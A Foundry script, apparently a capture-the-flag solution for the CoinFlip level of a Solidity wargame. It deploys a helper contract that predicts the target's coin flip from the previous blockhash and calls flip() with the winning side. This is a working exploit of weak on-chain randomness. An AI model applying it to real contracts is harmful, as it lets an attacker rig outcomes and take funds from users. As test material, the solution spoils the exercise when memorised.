// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "lib-src/Script.sol";
import {console} from "lib-src/console.sol";

import {CoinFlip} from "src/CoinFlip.sol";

// forge script script/3_CoinFlip.s.sol -vvv
contract CoinFlipSolution is Script {

    CoinFlip public target = CoinFlip(0x0cC56c78024e50bFdca9E2Dc7cE5bC959376cb2A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(target);
        console.log("Flip success:", target.consecutiveWins());
        vm.stopBroadcast();
    }
}

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlip.flip(side);
    }
}
